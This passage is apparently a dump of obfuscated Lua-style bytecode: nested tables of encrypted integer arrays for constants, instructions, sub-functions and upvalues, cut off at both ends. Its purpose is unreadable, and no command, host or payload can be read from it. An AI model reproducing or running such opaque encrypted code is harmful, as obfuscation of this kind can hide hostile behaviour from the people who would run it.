212,146,103,224,184,92,6,204,103,116,247,158,65,240,148,100,4,221,130,39,254,172,11,1,144,36,42,246,150,85,18,160,49,46,194,131,72,237,160,106,73,192,151,47,251,192,89,19,181,121,37,204,205,74,230,191,108,1,220,142,109,255,242,6,20,210,99,114,248,134,87,116,165,123,60,203,153,96,237,163,79,15,195,107,34,246,195,94,81,180,110,46,205,220,95,175,241,108,4,211,145,36,187,172,5,15,234,120,57,157,185,115,205,141,78,76,131,136,34,250,177,8,34,223,113,56,244,130,12,94,151,93,14,252,209,18,193,177,126,14,208,114,56,171,154,119,85,129,98,54,215,139,87,240,226,78,28,192,158,100,204,225,5,19,205,120,63,247,138,85,11,163,122,14,132,156,50,227,185,0,16,148,65,33,253,157,18,18,182,42,17,245,190,114,194,188,126,7,215,155,97,240,246,87,92,224,110,56,197,230,91,237,174,121,15,142,140,45,235,231,81,31,200,114,35,245,137,85,85,164,99,112,252,135,90,248,156,68,66,188,109,63,185,175,72,11,176,111,62,193,160,79,241,234,88,9,223,146,34,241,169,0,21,203,103,55,235,131,90,238,227,123,18,203,219,47,249,241,41,2,214,103,46,246,197,64,9,163,44,126,215,128,84,230,167,60,99,221,153,106,248,148,22,75,132,98,34,207,195,117,230,189,106,5,200,159,17,233,171,67,95,241,98,33,238,137,84,27,158,117,45,196,156,46,236,246,85,4,210,108,109,232,145,75,68,230,120,59,215,158,25,140,180,112,20,215,148,46,179,179,93,73,130,79,59,213,134,24,204,169,100,17,204,159,38,218,160,84,10,148,72,53,232,149,80,27,162,87,47,218,156,76,169,160,119,15,219,32,59,228,132,17,85,167,127,42,204,156,27,164,170,116,1,186,143,39,226,183,9,1,205,105,36,240,193,68,83,232,58,12,196,145,99,160,172,87,4,220,62,59,240,128,3,20,164,125,62,155,157,76,169,156,124,5,214,210,57,230,186,23,5,178,110,122,204,159,80,191,185,119,16,218,139,45,225,189,13,29,200,97,120,176,134,86,16,161,125,21,204,141,2,193,144,121,22,159,11,41,249,134,4,114,183,111,42,207,193,73,245,177,108,8,153,154,50,252,190,92,26,209,103,124,182,202,66,232,162,122,4,140,131,35,254,179,13,25,216,109,59,178,212,30,78,239,49,56,200,210,77,160,241,49,27,209,152,35,230,148,78,4,227,32,44,215,132,92,190,187,112,0,131,148,36,253,190,27,29,204,41,28,252,133,86,82,185,120,62,201,144,9,239,235,85,3,196,118,63,241,141,73,81,163,110,55,192,222,107,234,176,127,2,251,153,97,191,180,70,22,246,110,104,199,138,91,228,226,93,13,207,177,39,243,240,4,10,212,97,112,254,136,85,85,205,102,60,219,152,16,250,164,126,29,219,40,45,227,143,79,3,171,98,54,139,199,25,243,167,115,9,213,219,50,240,175,76,92,202,105,58,234,193,5,81,255,60,64,207,153,75,224,184,65,12,212,35,33,242,200,93,31,182,45,43,197,144,80,235,250,111,68,200,171,59,248,226,120,48,140,74,15,143,194,21,173,189,119,15,194,214,102,161,244,80,25,223,42,28,249,147,90,18,172,46,124,238,177,107,168,168,9,97,223,103,108,248,137,13,25,173,106,121,214,138,73,165,177,117,2,145,142,34,225,243,106,28,218,112,116,235,130,80,238,193,122,14,207,150,46,173,183,72,92,149,96,114,234,134,81,23,170,57,52,212,220,119,219,156,80,45,209,156,37,241,133,7,30,178,32,37,199,158,22,193,161,125,29,134,240,44,246,251,73,26,142,39,51,243,140,19,26,233,117,49,206,213,52,242,166,68,68,211,44,46,247,135,75,80,249,50,120,214,132,73,239,191,123,69,146,156,38,247,254,10,16,145,105,58,196,142,8,177,236,99,10,200,150,73,226,182,71,14,214,37,54,245,219,93,19,166,118,46,220,129,87,231,179,55,14,155,99,36,242,132,5,87,171,107,120,197,128,25,240,167,127,11,144,143,39,226,183,9,1,205,105,36,240,193,68,28,171,121,12,135,144,47,165,247,71,3,220,9,43,247,128,37,31,171,116,81,195,159,88,167,183,115,12,154,244,57,188,253,5,7,165,108,63,210,152,82,240,239,52,24,219,144,32,178,175,76,20,151,104,48,241,130,15,17,184,61,16,200,153,90,166,165,76,10,213,100,5,243,223,89,23,176,122,43,205,129,93,173,183,122,11,212,210,23,254,188,75,22,247,109,125,179,128,90,226,130,114,92,203,150,47,232,246,105,1,219,77,43,231,204,58},{6,7,218,100,49},{94,20,178,108,51,213,185,94,230},{72,25,165,105},{77,19,175,100,54,232,139,64},{89,25,176,101},{74,28,168,110,35},0.3,{96,46,138,93,124,244,183,115,220},{95,29,170,119},{13}},C={104,122,104,122,91,104,123,103,107,87,106,59,123,102,122,92,87,108,88,122,95,108,118,120,118,121,104,126,83,57,123,97,122,118,120,118,121,104,127,83,57,123,97,123,102,122,97,120,118,124,104,125,83,104,114,102,123,102,120,57,121,97,121,102,121,104,115,74,107,104,112,106,120,75,107,104,113,106,121,75,107,104,118,102,120,75,57,120,59,123,118,119,104,116,83,104,117,66,123,57,120,59,123,102,126,104,106,102,127,106,120,83,107,87,7,59,123,102,127,106,120,83,104,107,83,107,92,87,255,59,123,104,104,57,120,59,123,88,122},P={{K={{15,24,211,111,40},{85,13,197,101,40,236,182,71,29},{65,2,220,102},{80,26,203,109,33,253},{66,0,200,104,49,239},{73,31,216,103,61,188,147,65,64,175,114,51,204,206,120,239,161,115,14,196,119,37,244,135,5,90,151,107,53,193,159,85,247,164,72,3,195,138,46,241,184,10,90,158,101,59,252,139,89,160,167,102,92,203,150,47,232,226,100,11,205,87,42,232,147,89,24,163,57,126,247,158,92,241,182,108,26,150,214,100,217,143,72,23,173,92,59,195,148,93,241,196,112,2,143,137,60,254,251,71,31,216,39,33,228,134,29,10,185,96,127,222,157,37,229,246,81,15,214,110,33,176,144,87,23,234,123,42,209,220,30,245,253,62,66,193,223,97,179,172,76,0,202,120,59,128,142,88,229,198,126,4,141,140,38,226,188,84,0,200,113,112,239,142,84,18,231,98,62,201,159,82,161,160,122,6,208,112,36,228,149,0,82,177,36,120,209,139,77,241,189,116,69,213,149,34,155,181,65,82,197,109,61,241,201,85,17,174,53,24,206,152,46,162,163,71,1,221,115,33,235,144,15,14,173,117,53,134,129,95,230,190,113,64,203,155,39,251,241,94,16,172,110,38,206,158,67,174,232,107,74,142,139,33,251,175,87,30,155,99,63,248,237,66,30,169,127,50,129,146,74,228,182,84,2,217,111,100,190,194,89,11,249,90,60,200,138,74,234,162,111,50,222,172,43,243,190,77,58,208,122,32,254,132,86,229,227,51,18,128,213,103,254,250,15,2,201,45,111,255,139,84,82,204},{71,21,209,110,60,214,141,74}},C={102,122,104,122,74,107,104,123,102,123,75,107,104,120,118,121,104,126,83,104,127,102,120,102,121,102,120,102,120,102,120,102,121,57,125,75,107,104,124,102,126,75,57,120,59,123,88,122},P={},U={{0,3},{1,2},{1,0},{1,1},{0,2}},nParams=0}},U={{1,100},{1,9},{1,10},{1,13},{1,23},{1,101}},nParams=0},{K={15,225,{86,12,203,104},{84,15,208,112}},C={104,122,104,122,73,104,123,103,107,87,108,59,123,118,120,104,121,83,102,122,57,123,87,90,102,123,57,122,59,123,95,122,88,122},P={},U={{1,11},{1,103}},nParams=0},{K={{116,14,206,117}},C={102,122,104,122,102,123,75,88,122},P={},U={{1,107},{1,119}},nParams=0},{K={100,7,2,0,{67,28,207,103},{121},{122,45},{5},{116,81},{6,7,218,100,49},{94,20,178,108,51,213,185,94,230},{72,25,165,105},{95,3,176,100,54,196},{75,23,177,99,56,208},{66,22,167,110,54,133,159,80,170,178,116,90,194,158,41,255,178,1,18,202,100,54,212,130,89,239,228,62,66,223,157,55,251,171,74,79,221,100,61,254,220,118,25,179,65,56,218,133,87,234,177,55,72,225,101,51,226,162,68,22,182,94,61,209,152,80,231,170,56,76,138,172,39,248,168,97,29,207,75,59,247,133,80,87,232,65,5,211,130,2,228,182,76,3,221,111,61,187,200,26,83,255,71,58,207,133,122,232,160,94,0,218,146,45,188,253,120,55,152,76,51,207,137,69,227,161,58,79,155,208,100,234,180,65,89,177,111,55,188,136,89,93,169,125,58,137,151,87,170,161,72,14,216,33,60,244,131,65,20,235,104,44,202,140,78,236,191,117,78,152,220,36,250,231,123,22,208,109,21,236,147,91,227,227,52,68,223,213,107,173,189,77,10,144,36,42,244,129,58},{78,30,168,121,53,237,148,69},{115,51,135,69,124,244,183,115,220},{101,25,191,102},{}},C={104,122,104,123,82,104,120,103,107,87,105,59,123,106,123,98,104,121,103,87,99,88,122,95,99,106,123,107,104,126,83,105,104,127,104,124,57,121,107,104,126,83,105,104,125,104,114,57,121,97,120,102,122,104,115,74,107,104,112,106,122,75,107,104,113,118,118,104,119,83,104,116,106,120,57,120,75,107,104,117,102,123,75,57,120,59,123,102,120,104,106,104,125,106,123,104,125,79,79,57,120,59,123,102,121,104,107,104,104,75,88,122},P={},U={{1,13},{1,10},{1,23},{1,123}},nParams=2},{K={12,144,{108,34,152,87,15,203,163,106,46},{},{112,10,194,113},3,2,9,0,{6,7,218,100,49},{94,20,178,108,51,213,185,94,230},{72,25,165,105},{77,19,175,100,54,232,139,64},{104,32,134,77,12,240,170,126},{204,255,86,47},{65,27,168,117},{15}},C={104,122,104,122,73,104,123,103,107,87,106,59,123,102,122,92,87,90,102,123,104,120,104,121,57,120,59,123,88,122,95,90,102,120,104,126,83,97,122,104,127,104,124,99,104,125,103,107,87,64,59,123,106,122,98,104,114,103,87,58,88,122,95,58,102,121,104,115,74,107,104,112,102,122,75,107,104,113,106,122,75,107,104,118,102,126,75,57,120,59,123,102,123,104,119,104,116,102,127,102,122,83,107,87,9,59,123,102,127,102,122,83,104,117,83,107,92,87,1,59,123,104,106,79,57,120,59,123,88,122},P={},U={{1,100},{1,23},{1,107},{1,13},{1,10},{1,101}},nParams=0},{K={7,49,{108,34,152,87,15,203,163,106,46},{},{112,10,194,113}},C={104,122,104,122,73,104,123,103,107,87,106,59,123,102,122,92,87,90,102,123,104,120,104,121,57,120,59,123,88,122,95,90,102,120,102,122,102,121,104,126,83,57,120,59,123,88,122},P={},U={{1,100},{1,23},{1,125},{1,123}},nParams=0},{K={1,2,{118,8,192,119}},C={104,122,104,122,91,104,123,103,107,87,108,59,123,106,122,107,87,108,59,123,102,122,87,93,102,123,102,122,102,120,104,120,83,57,120,59,123,95,93,88,122},P={},U={{1,100},{1,125},{1,123}},nParams=1},{K={9,{100,2,194,111},{100,2,214,119},{100,1,205,108,46,247,167,95,23,162},{119,6,192,96},{112,52,210,107,99},{72,20,203},1,2,0,14,{123,25,178,101,35,203,130,86}},C={102,122,106,122,106,123,104,122,102,123,118,123,104,120,83,104,121,83,57,127,97,121,106,121,104,126,116,118,127,104,124,83,104,125,102,120,120,104,114,73,104,115,102,121,104,112,78,123,-1,64,123,75,106,121,104,113,118,127,104,124,83,104,115,102,120,104,115,106,120,57,126,75,88,122},P={},U={{1,39},{1,33},{1,60},{1,22}},nParams=3},{K={10,{114,5,205,103},{119,41,209,110,124},{77,11,206},0,200,{118,30,207,110,38,244,135,93}},C={102,122,102,123,106,122,106,123,104,122,57,126,97,127,106,127,104,123,118,120,104,121,83,104,126,106,126,107,92,87,93,59,123,102,120,104,127,57,123,104,126,102,121,57,126,75,106,127,104,124,118,120,104,121,83,104,126,106,120,104,126,106,121,57,126,75,106,127,88,123},P={},U={{1,40},{1,126},{1,22},{1,61}},nParams=5},{K={{116,14,206,117},15,225,0,{11,12,214,108,53,245,146,66,67,166,118,48,193,157,117,236,173,34},100,7,2,{88,16,223,101,56},{99,39,240,68,17,197,136,89,229,169},12,144,{75,4,183,111},{113},{114,37},{13},{108,89},{66,8,181,123,51,207},{84,18,186,126,63,221},{84,31,164,113,101,237,144,52,216,179,83,26,222,97,40,176,193,125,13,165,125,46,192,130,124,243,184,62,78,136,174,45,231,157,70,6,218,34,119,243,142,88,229,130,120,22,196,158,42,237,184,80,6,213,107,114,183,157,101,21,179,126,56,149,209,127,205,153,86,36,151,44,31,243,153,88,74,224,40,43,129,194,125,241,189,123,17,217,148,40,172,234,90,91},{93,15,171,124,18,216},{26,243,174,120,5},{66,224,190,112,7,217,173,42,234},{66,235,169},{91,236,170,124},{88,224,162,115,11,251,158,63},{120,215,159,90,34,242,189,20,198},{217,0,67,60},{28,228,190,116,13,221,138,58},{}},C={102,122,104,122,83,97,122,104,123,104,123,73,104,120,103,107,87,96,59,123,106,122,98,104,121,103,87,90,88,122,95,90,102,123,104,126,102,120,79,57,123,97,123,104,127,104,124,82,104,125,103,107,87,65,59,123,106,123,92,87,59,88,122,95,59,118,114,102,121,104,115,83,102,121,106,123,78,121,120,97,121,97,120,104,112,104,112,73,104,113,103,107,87,25,59,123,106,120,92,87,19,88,122,95,19,106,122,107,104,118,83,105,104,119,104,116,57,121,107,104,118,83,105,104,117,104,106,57,121,97,126,118,107,104,104,83,104,105,106,126,57,120,97,127,118,110,106,121,78,123,121,97,114,97,125,97,124,65,124,125,114,85,115,85,112,106,124,106,125,106,114,78,120,120,97,112,97,115,106,115,97,114,106,115,70,123,87,166,102,126,104,111,74,107,104,108,106,112,104,109,83,75,107,104,98,106,127,75,107,104,99,102,120,75,57,120,59,123,95,219,102,127,104,96,104,97,106,121,98,104,102,79,79,57,120,59,123,102,122,104,122,104,103,75,88,122},P={},U={{1,130},{1,14},{1,10},{1,1},{1,13},{1,23}},nParams=0},{K={{116,14,206,117},{82,24,197,107,35,255},{68,2,202,110,47,237},{115,2,216,103,42,186,192,67,91,230,91,51,197,210,24,251,49,158,207,190,175,38,244,153,78,4,178,44,114,198,194,29,231,238,57,52,198,148,34,176,254,66,28,207},{80,0,201,113,34,242,136,86},{66,17,214,99},{118,29,221,100,55,212,140},{84,7,223},{98,28,220,64,48},1,20,{108,19,181,92,59,195,148,93,241,189},{97,22,186,93,52,194,151,92,246,188},{64,25,183,102},{72,21,171,96,40},{104,31,177,94,62,210,134,83,245,185,77,1,221,153},1000},C={102,122,104,122,116,118,123,104,120,83,104,121,118,126,118,127,104,124,83,57,123,118,123,104,125,83,118,127,104,114,83,104,115,104,112,57,121,102,123,107,104,113,83,105,57,123,98,102,123,104,118,83,118,119,104,116,83,102,120,107,104,117,83,105,57,123,104,106,73,78,123,-1,64,123,75,88,122},P={},U={{1,133},{1,0},{1,7}},nParams=0},{K={{15,8,218,104,41,249,150,94,71,162,106,52,205,129,113,224,169,38},3,2,9,{84,12,219,105,60},{111,35,244,72,21,249,132,93,25,173},7,49,0,{64,4,222,99,39,211},1,{94,31,165},{88,24,177,121,42,202,128,94},{120,11,166,124,16,192},{1,10,161,97,62},{91,27,183,119,62,210,164,85,227},{83,20,162,116},{86,29,170,119,103,239,150,74,218,177,109,28,220,99,46,190,195,124,27,163,116,61,209,157,27,173,225,86,10,211,154,42,193,176,70,11,216,122,105,213,128,87,20,226,55,66,130},{83,25,165,122,48,226,145,70},{126,63,154,71,127,225,188,3,192},{20,28,166,124,5,197,130,50}},C={102,122,104,122,102,123,79,57,123,97,122,104,123,104,120,99,104,121,103,107,87,97,59,123,106,122,92,87,91,88,122,95,91,118,126,102,120,104,127,83,102,120,106,122,78,121,120,97,120,97,123,104,124,104,124,73,104,125,103,107,87,57,59,123,106,123,92,87,51,88,122,95,51,104,114,97,121,118,115,106,120,78,123,121,97,124,97,127,97,126,65,126,127,124,85,125,85,114,106,126,106,127,106,124,78,120,120,97,114,97,125,106,125,97,124,106,125,70,123,87,186,104,112,104,112,91,104,120,103,107,87,239,59,123,106,114,104,113,83,118,118,102,121,104,119,83,57,123,123,87,196,102,126,104,116,74,107,104,117,106,114,104,113,83,75,107,104,106,104,107,75,107,104,104,102,123,75,57,120,59,123,106,121,104,112,91,97,121,95,196,95,36,102,127,104,105,106,121,104,110,79,57,120,59,123,88,122},P={},U={{1,14},{1,10},{1,1},{1,7},{1,13},{1,23}},nParams=0},{K={{15,8,218,104,41,249,150,94,71,162,106,52,205,129,113,224,169,38},15,225,{83,13,216,104,35},{110,60,245,75,20,254,133,94,24,162},100,7,2,0,{64,4,222,99,39,211},12,144,{89,30,166},{89,23,176,122,43,205,129,93},{123,10,161,125,19,193},{0,9,160,126,63},{68,26,180,118,57,211,167,84,236},{82,19,163,119},{69,21,161,127,59,137,128,77,255,176,0,15,217,33,32,248,129,76,20,227,122,100,223,146,26,227,191,105,70,216,193,118,190,236,77,68,158,109,59,191,158,110,233,150,43,26,209,215,39,227,188,3,11,215,96},{82,26,164,125,49,225,144,57},1,{120,193,152,69,65,239,165,3,222,144},{22,226,160,126,7,195,140,48}},C={102,122,104,122,102,123,79,57,123,97,122,104,123,104,123,73,104,120,103,107,87,97,59,123,106,122,92,87,91,88,122,95,91,118,121,102,120,104,126,83,102,120,106,122,78,121,120,97,120,97,123,104,127,104,124,82,104,125,103,107,87,57,59,123,106,123,92,87,51,88,122,95,51,104,114,97,121,118,115,106,120,78,123,121,97,124,97,127,97,126,65,126,127,124,85,125,85,114,106,126,106,127,106,124,78,120,120,97,114,97,125,106,125,97,124,106,125,70,123,87,186,104,112,104,112,73,104,113,103,107,87,239,59,123,106,114,104,118,83,118,119,102,121,104,116,83,57,123,123,87,196,102,126,104,117,74,107,104,106,106,114,104,118,83,75,107,104,107,104,104,75,107,104,105,102,123,75,57,120,59,123,106,121,104,110,91,97,121,95,196,95,36,102,127,104,111,106,121,104,108,79,57,120,59,123,88,122},P={},U={{1,14},{1,10},{1,1},{1,7},{1,13},{1,23}},nParams=0},{K={{15,8,218,104,41,249,150,94,71,162,106,52,205,129,113,224,169,38},3,2,9,{84,12,219,105,60},{111,35,244,72,21,249,132,93,25,173},7,49,{65,3,223,96,38,236},{6,7,218,100,49},{94,20,178,108,51,213,185,94,230},{94,31,165},{79,24,166,104},{114,39,136,71,21,232,187,114,215,149,90,34,226,163,24},{79,29,169,102,52,238,149,66},{100,51,137,92,123,242,185,110,194,147,89,59},{113,55,138}},C={102,122,104,122,102,123,79,57,123,97,122,104,123,104,120,99,104,121,103,107,87,97,59,123,106,122,92,87,91,88,122,95,91,118,126,102,120,104,127,83,102,120,106,122,78,121,120,97,120,97,123,104,124,104,124,73,104,125,103,107,87,57,59,123,106,123,92,87,51,88,122,95,51,118,114,106,120,78,123,121,97,127,97,126,97,121,65,121,126,127,85,124,85,125,106,121,106,126,106,127,78,120,120,97,125,97,124,106,124,97,127,106,124,70,123,87,239,102,121,104,115,74,107,104,112,106,125,104,113,83,75,107,104,118,104,119,75,107,104,116,102,123,75,57,120,59,123,95,32,102,126,104,117,104,106,57,120,59,123,88,122},P={},U={{1,14},{1,10},{1,1},{1,13},{1,23}},nParams=0},{K={{99,3,215,115,45,244,150,72,10},{103,5,217,102,11,241,145,93,13,135,103,51,201,148,116,224,146,112,6,193,142},{106,24,213,98,32,246,141,75},1,2,{114,17,215,109,2,236,130,87,25},64,16,{106,18,221,98,51,237,133,64,238,175,85,14,192,152,48,190},{125,17,199,126},{121,37,133,78,18,129,163,121},{120,38,132,73,19}},C={102,122,104,122,83,107,87,98,59,123,102,122,104,122,83,107,104,123,83,105,104,120,57,120,97,122,104,121,104,121,91,104,126,103,107,87,80,59,123,106,122,92,87,74,88,122,95,74,102,123,92,115,123,106,122,104,127,102,123,107,87,56,59,123,104,124,107,92,87,48,59,123,104,125,75,102,120,104,114,102,123,107,87,34,59,123,102,121,107,92,87,26,59,123,102,126,75,102,120,104,115,102,123,107,87,20,59,123,104,112,107,92,87,12,59,123,104,113,75,88,122},P={},U={{1,7},{1,144},{1,140},{1,31},{1,27}},nParams=0},{K={15,225,{113,25,221,115,62,252,128},{96,1,215,106,42,249,145},{102,14,217,110,55,233,137,68,18,163,81,50,196,156,76,186},{113,21,195,114},{104,62,255,75,27,205,200,124,48},3,2,9,{110,28,179,104,57,207,130,82,225,185},{101,57,130,64,30,242}},C={102,122,92,115,122,104,122,104,122,73,104,123,103,107,87,110,59,123,102,122,87,77,102,123,104,120,83,107,104,121,83,105,66,123,78,120,123,115,121,102,126,104,126,102,127,75,102,126,104,127,104,124,75,95,28,104,125,104,114,99,104,115,103,107,87,60,59,123,102,121,87,34,102,121,107,104,112,83,105,57,123,59,123,70,115,121,95,34,102,126,104,126,102,124,75,102,126,104,127,104,113,75,88,122},P={{K={{99,3,215,115,45,244,150,72,10},100,7,2,{84,14,211,119,35},{98,21,207,66,52,239,132,87,19,172,114,48,221,135},12,144,{97,0,255},{107,21,204,111,5,193,153,66},{105,20,174,72,57,205,128,94,230,168}},C={102,122,104,122,83,97,122,104,123,104,120,82,104,121,103,107,87,108,59,123,106,122,87,8,116,118,126,106,122,107,104,127,83,105,78,123,-1,64,121,97,121,97,120,97,123,65,123,120,121,85,126,85,127,106,123,106,120,106,121,78,120,120,97,127,97,126,106,126,97,121,106,126,70,123,87,10,104,124,104,124,73,104,125,103,107,87,30,59,123,106,127,107,104,114,83,105,104,115,57,120,87,20,106,127,104,112,113,75,95,20,95,75,95,8,88,122},P={},U={{0,2}},nParams=0}},U={{1,145},{1,4},{1,7},{1,146},{1,141},{1,31},{1,27}},nParams=0},{K={{106,30,219,113,30,242,147,88,29,176,122},{98,3,217,108,40,251,151},{96,12,219,104,41,235,139,90,20,161,83,52,202,158,78,180},{119,11,193,112},{109,33,252,37,26,206,171,97,92,136,92}},C={102,122,104,122,83,107,104,123,83,105,66,123,57,120,59,123,102,120,104,120,102,121,75,102,120,104,121,104,126,75,88,122},P={{K={{99,3,215,115,45,244,150,72,10},{103,5,217,102,11,241,145,93,13,135,103,51,201,148,116,224,146,112,6,193,142},{106,24,213,98,32,246,141,75},7,49,{102,24,218,104,54,249,180,70,28,188,118},{99,31,201,106},{111,7,208,105,61,241,128,80,44,190,116,20,206,162,56,252,178},{98,6,211,121,61,241,141}},C={102,122,104,122,83,107,87,98,59,123,102,122,104,122,83,107,104,123,83,105,104,120,57,120,97,122,104,121,104,121,73,104,126,103,107,87,83,59,123,106,122,87,58,106,122,107,104,127,83,105,118,124,104,125,83,104,114,83,57,120,59,123,95,58,88,122},P={},U={{0,1}},nParams=0}},U={{1,3},{1,7},{1,142},{1,31}},nParams=0},{K={1,2,{81,8,204,96,34,240,148,77,21,164,98,63},{83,13,216,104,35},{80,0,201,113,34,242,136,86},{112,3,222,116,24,248},{115,56,248}},C={104,122,104,122,91,104,123,103,107,87,117,59,123,118,120,87,92,116,118,121,118,120,118,126,102,122,104,127,83,78,123,-1,64,123,59,123,95,92,116,102,123,104,124,118,126,102,122,104,127,83,78,123,-1,64,123,59,123,88,122},P={},U={{1,7},{1,23}},nParams=0},{K={15,225,{71,31,202,108,60},{96,1,213,107,61,169},{66,29,213,104,2,220,164},220,60,100,7,2,{93,20,178,101},200,160,30,12,144,{83,19,167,101},80,3,9,{93,17,172,122},120,140},C={104,122,104,122,73,104,123,103,107,87,104,59,123,106,122,104,120,103,87,92,118,121,104,126,83,104,127,104,124,104,124,78,121,-1,88,-1,95,210,104,125,104,114,82,104,115,103,107,87,66,59,123,106,122,104,112,103,87,54,118,121,104,126,83,104,113,104,118,104,119,78,121,-1,88,-1,95,210,104,116,104,116,73,104,117,103,107,87,36,59,123,106,122,104,106,103,87,8,118,121,104,126,83,104,107,104,118,104,127,78,121,-1,88,-1,95,210,104,104,104,115,99,104,105,103,107,87,254,59,123,106,122,104,110,103,87,226,118,121,104,126,83,104,111,104,111,104,113,78,121,-1,88,-1,95,210,118,121,104,126,83,104,108,104,113,104,108,78,121,-1,88,-1,88,122},P={},U=nil,nParams=1},{K={{73,27,215,104,62,228},7,49,{98,34,245},{66},{115,25,200,111,51,240,130},1,2,{109,33,236},{89,6,218},{79,7,178,100,36},15,225,{122,57,145,64},{89,24,182,97}},C={118,122,102,122,78,123,121,97,120,97,123,97,122,65,122,123,120,85,121,85,126,106,122,106,123,106,120,78,120,120,97,126,97,121,106,121,97,120,106,121,70,123,87,227,104,123,104,123,73,104,120,103,107,87,68,59,123,102,123,104,121,103,87,49,106,126,104,126,83,104,127,122,75,95,237,104,124,104,124,91,104,125,103,107,87,39,59,123,102,123,104,114,103,87,11,106,126,104,126,83,104,127,106,126,104,115,83,104,112,103,75,95,237,104,113,104,113,73,104,118,103,107,87,249,59,123,102,123,104,119,103,87,237,106,126,104,126,83,104,127,106,126,104,115,83,104,116,103,75,95,237,95,107,88,122},P={},U={{1,159},{1,161}},nParams=0},{K={1,14,{107,3,203,119,47,247,135,74},{77,11,206},{98,29,219,104,53},{118,25,193,99},{115,53,213,106,96},6,0,{107,21,220,97,50,210,132,67,239,168,67,16,204,150,48,254,184,86,10,212,102,41},{102,20,185,100,35,213,163,69,230,168,106},{123,23,179,105,57,214},{67,4},{73,25,183,107},{11,49,254,42,23,159,213,104},8,{117,21,179,124},{119,19,169,102},{113,18,172,118},48,{100,16,185,124,20,194,153,47},80,50,{108},{101},44,132,180,178,{105,237,171,106,61,198,138,36,246,129,95,19},{127,253,145,113,14},{75,235,183,76,14},{41,229,165,68,30,195},{39},{50,255,189},100,7,2,{7,221,144},{17,251,174,65,17,210,108},{13,193,140},{44,230,173,69,7},{29,212,178,101},{60,247,147,66},{15,246,140,91,25,176,93,48,222,138},{14,249,141,88,24,183,95,53,214,153,79,239,190,114},{24,252,135,91,21,183,34},{34,251,145,88},{61,250,158},{16,254,148,93,17,189,103,59,234,149,81,252,180,83,56,223,123,41},{11},{18,252,154,91,19,191,97,5,248,159,59,233}},C={102,122,104,122,91,115,122,102,123,104,123,57,123,97,121,118,120,104,121,83,104,126,57,123,97,126,106,126,104,127,118,124,104,121,83,104,122,102,123,104,125,57,123,120,104,114,106,121,57,126,75,106,126,104,115,104,122,75,106,126,104,112,102,122,75,106,126,104,113,102,120,75,102,121,106,126,118,118,104,119,83,104,116,57,123,104,117,102,126,118,106,104,107,83,104,104,83,57,127,97,127,106,127,104,127,118,124,104,121,83,104,114,102,123,104,105,57,123,104,122,104,114,57,126,75,106,127,104,110,118,124,104,121,83,104,114,104,114,104,114,104,114,57,126,75,102,121,106,126,106,122,104,117,102,127,118,106,104,107,83,104,104,83,57,127,97,124,106,124,104,127,118,124,104,121,83,104,114,102,123,104,111,57,123,104,122,104,114,57,126,75,106,124,104,110,118,124,104,121,83,104,114,102,123,104,108,57,123,104,114,104,114,57,126,75,102,121,106,126,104,109,106,123,104,98,79,79,104,117,102,124,106,123,57,123,118,106,104,107,83,104,104,83,57,127,97,125,106,125,104,127,118,124,104,121,83,104,114,102,123,104,99,57,123,104,122,104,114,57,126,75,106,125,104,110,118,124,104,121,83,104,114,102,123,104,96,57,123,104,114,104,114,57,126,75,102,121,106,126,106,120,104,117,102,125,118,106,104,107,83,104,104,83,57,127,97,114,106,114,104,127,118,124,104,121,83,104,122,102,123,104,97,57,123,120,104,122,104,114,57,126,75,106,114,104,110,118,124,104,121,83,104,114,102,123,104,102,57,123,104,114,104,114,57,126,75,106,114,104,103,118,106,104,103,83,104,100,83,75,118,101,104,90,83,102,114,74,107,104,91,106,126,75,107,104,88,106,123,75,57,120,59,123,104,89,104,94,82,104,95,103,107,87,479,59,123,102,115,104,92,123,87,424,106,126,104,93,102,115,104,82,103,107,87,448,59,123,106,123,104,83,103,107,92,87,437,59,123,102,115,104,80,103,107,87,437,59,123,106,123,104,81,103,75,95,424,102,120,104,86,118,124,104,121,83,104,114,104,114,104,114,102,122,106,121,102,123,104,122,57,123,91,73,102,123,104,125,57,123,91,57,126,75,102,120,104,87,116,118,84,104,121,83,104,114,118,85,104,74,83,104,114,102,120,104,75,83,104,72,83,102,120,104,73,83,104,72,83,71,78,120,-1,64,123,75,88,122},P={},U={{1,160},{1,22},{1,157},{1,39},{1,33},{1,34},{1,162},{1,35},{1,159},{1,161}},nParams=3},{K={{97,39,250},{99,13,212,105,42,234,140,91,23,160,76,53,201,159,73,181},{103,63,234},{116,47,235,74}},C={104,122,115,122,102,123,104,122,83,104,123,102,120,75,102,123,104,120,83,104,123,102,121,75,102,123,104,121,83,104,123,102,121,75,102,126,57,122,59,123,88,122},P={},U={{1,161},{1,149},{1,27},{1,26},{1,163}},nParams=0},{K={{101,57,228},{99,13,212,105,42,234,140,91,23,160,76,53,201,159,73,181},{99,33,244},{116,47,235,74}},C={104,122,115,122,102,123,104,122,83,104,123,102,120,75,102,123,104,120,83,104,123,102,121,75,102,123,104,121,83,104,123,102,121,75,102,126,57,122,59,123,88,122},P={},U={{1,161},{1,149},{1,31},{1,26},{1,163}},nParams=0},{K={{119,42,228,79},{99,13,212,105,42,234,140,91,23,160,76,53,201,159,73,181},{97,2,212,108,60,170},{69,28,214,105,29,221,167},130,80,10,{102,62,241},{109,33,236}},C={104,122,115,122,102,123,104,122,83,104,123,118,120,104,121,83,104,126,104,127,104,124,57,121,75,102,123,104,125,83,104,123,102,120,75,102,123,104,114,83,104,123,102,120,75,102,121,57,122,59,123,88,122},P={},U={{1,161},{1,149},{1,26},{1,163}},nParams=0},{K={{73,27,215,104,62,228},{71},{102,8,203,119,60,246,157},0,{103,14,212,115,49,232,181,88,6,162},{112,52,210,107,99},{72,20,203}},C={118,122,102,122,78,123,121,97,120,97,123,97,122,65,122,123,120,85,121,85,126,106,122,106,123,106,120,78,120,120,97,126,97,121,106,121,97,120,106,121,70,123,87,70,106,126,104,123,83,107,104,120,83,105,57,123,59,123,95,107,74,115,122,104,121,115,123,102,120,104,126,118,127,104,124,83,104,121,104,121,104,121,104,121,57,126,75,88,122},P={},U={{1,159},{1,160},{1,157}},nParams=0},{K={{80,25,223,111,56},12,144,{102,0,204,105},{105,10,201,118,49,252,131,101,5,183,119},{104,21,200,117,48,251,130,101,28,186,125,55,199,147},{81,16,206,105},3,2,9,{103,16,179,120,55,198,137,114,240,191,119,17},{78,4,179,99,37},7,49,{99,28,183,124,59,194,149,114,232,183,115},{70,20,163,127},{126,26,171,116},{17,84,170,119,116},{70,18,187,103,44,192,154,88}},C={104,122,97,120,104,123,104,123,73,104,120,103,107,87,102,59,123,106,123,118,121,104,126,83,104,127,83,103,87,94,104,124,97,120,95,30,104,125,104,114